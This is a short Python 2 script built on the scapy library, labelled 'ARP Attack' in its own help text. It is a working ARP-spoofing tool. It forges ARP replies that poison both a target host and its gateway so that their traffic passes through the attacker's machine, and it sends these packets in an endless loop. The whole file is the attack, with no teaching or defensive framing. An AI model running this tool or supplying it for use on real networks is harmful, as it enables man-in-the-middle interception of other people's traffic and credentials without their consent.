#!/usr/bin/env python
import os
import sys
import argparse
from scapy.all import(
        get_if_hwaddr,
        getmacbyip,
        ARP,
        Ether,
        sendp
        )
def get_mac(target_ip):
    target_mac = getmacbyip(target_ip)
    if target_ip is not None:
        return target_mac
    else:
        print("Cannot get the Target MAC,make sure the target is alive.")

def create_arp_station(src_mac,target_mac,gateway_ip,target_ip):
    eth = Ether(src=src_mac,dst=target_mac)
    arp = ARP(hwsrc=src_mac,psrc=gateway_ip,hwdst=target_mac,pdst=target_ip,op="is-at")
    pkt = eth / arp 
    return pkt

def create_arp_gateway(src_mac,gateway_mac,target_ip,gateway_ip):
    eth = Ether(src=src_mac,dst=gateway_mac)
    arp = ARP(hwsrc=src_mac,psrc=target_ip,hwdst=gateway_mac,pdst=gateway_ip,op="is-at")
    pkt = eth / arp
    return pkt

def main():
    try:
        if os.geteuid()!=0:
            print "[-]Please run as root!"
            sys.exit(1)
    except Exception,msg:
            print msg

    description = "ARP Attack"
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-sm',dest='srcmac',type=str,help='Source MAC,default=localhost mac')
    parser.add_argument('-t',dest='targetip',type=str,help='Target IP',required=True)
    parser.add_argument('-tm',dest='targetmac',type=str,help='Target MAC,default=autoget')
    parser.add_argument('-g',dest='gatewayip',type=str,help='Gateway IP',required=True)
    parser.add_argument('-gm',dest='gatewaymac',type=str,help='Gateway MAC,default=autoget')
    parser.add_argument('-i',dest='interface',type=str,help='The using net card',required=True)
    args = parser.parse_args()
    target_ip = args.targetip
    gateway_ip=args.gatewayip
    interface = args.interface
    srcmac = args.srcmac
    targetmac = args.targetmac
    gatewaymac = args.gatewaymac

    if target_ip is None or gateway_ip is None or interface is None:
        print(parser.print_help())
        exit(0)

    src_mac = srcmac
    if src_mac is None:
        src_mac = get_if_hwaddr(interface)
    print('local mac is :',src_mac)
    print('target ip is :',target_ip)

    target_mac = targetmac
    if target_mac is None:
        target_mac = get_mac(target_ip)
    print('target mac is :',target_mac)
    print('gateway ip is :',gateway_ip)

    gateway_mac = gatewaymac
    if gateway_mac is None:
        gateway_mac = get_mac(gateway_ip)
    print('gateway mac is :',gateway_mac)

    raw_input ("Enter the enter to continue.")

    pkt_station = create_arp_station(src_mac,target_mac,gateway_ip,target_ip)
    pkt_gateway = create_arp_gateway(src_mac,gateway_mac,target_ip,gateway_ip)
    
    while True:
        sendp(pkt_station,inter=1,iface=interface)
        sendp(pkt_gateway,inter=1,iface=interface)

if __name__ == '__main__':
    main()
